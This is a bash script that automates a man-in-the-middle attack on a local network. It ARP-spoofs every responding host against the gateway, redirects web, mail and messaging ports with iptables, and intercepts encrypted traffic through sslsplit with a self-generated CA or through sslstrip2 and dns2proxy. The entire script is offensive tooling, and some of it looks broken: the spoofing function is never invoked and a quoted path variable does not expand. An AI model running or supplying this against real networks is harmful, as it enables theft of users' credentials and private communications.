#!/bin/bash

open(){
read -p "What is the subnet(ex: 192.168.10.)" yn1
read -p "What Interface do you want to use(ex: wlan0)" int
read _ _ gateway _ < <(ip -4 route list type unicast dev ${int} exact 0/0)
for ip in {2..255}; do  # for loop and the {} operator
    ping -c 1 -t 1 $yn1$ip > /dev/null 2> /dev/null  # ping and discard output
    if [ $? -eq 0 ]; then  # check the exit code
        echo "${yn1}${ip} is up; Starting ARPspoof" # display the output
        # you could send this to a log file by using the >>pinglog.txt redirect
	arpspoof -i ${int} -t ${yn1}${ip} ${gateway} > /dev/null 2>&1 &
 	arpspoof -i ${int} -t ${gateway} ${yn1}${ip} > /dev/null 2>&1 &
    else
        echo "${yn1}${ip} is down"
    fi
done
}

setup(){
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
echo "WARNING: this is not an error but the iptables are going to be flushed if you still need something from there quit this program now!"
sleep 5
iptables -t nat -F
echo "Setting up new iptables"
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 # (HTTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 # (HTTPS connections)
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 # (STARTTLS SMTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 # (SSL SMTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 # (SSL IMAP connections)
iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080 # (messaging connections)
echo "Setting up ARPspoof"
read -p "What is the subnet(ex: 192.168.10.)" yn1
read -p "What Interface do you want to use(ex: wlan0)" int
#xterm -e "/root/Desktop/PROG/DedicatedARP.sh -s=${yn1} -i=${int}" &
}


ssplit(){
echo "Making Cert's"
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3560 -key ca.key -out ca.crt
setup
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
}

sstrip(){
setup
python '${DIR}/dns2proxy-master/dns2proxy.py' &
python '${DIR}/sslstrip2-master/sslstrip.py' -a -l 8080 &
python '${DIR}/sslstrip2-master/sslstrip.py' -a -l 8443 
}

for i in "$@"
do
case $i in
    --split)
    ssplit
    shift # past argument=value
    ;;
    --strip)
    sstrip
    shift # past argument=value
    ;;
    -l=*|--lib=*)
    LIBPATH="${i#*=}"
    shift # past argument=value
    ;;
    --default)
    DEFAULT=YES
    shift # past argument with no value
    ;;
    *)
            # unknown option
    ;;
esac
done

